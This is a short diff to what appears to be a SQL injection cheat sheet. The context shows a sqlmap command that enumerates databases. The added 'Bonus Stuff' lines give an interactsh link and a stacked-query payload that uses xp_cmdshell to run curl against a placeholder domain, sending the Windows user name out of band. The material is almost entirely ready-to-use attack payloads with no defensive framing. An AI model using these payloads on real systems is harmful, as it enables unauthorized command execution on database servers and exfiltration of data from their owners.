@@ -38,5 +38,10 @@ Note: Use LIMIT x,1 to enumerate more.
 # Automate the entire process.
 sqlmap -u "https://example.com/page?id=1" --dbs --batch
 
+-----
+
+Bonus Stuff :) 
+https://app.interactsh.com/
+QZYk'; EXEC xp_cmdshell 'curl http://domain_here/%USERNAME%';--
 
 
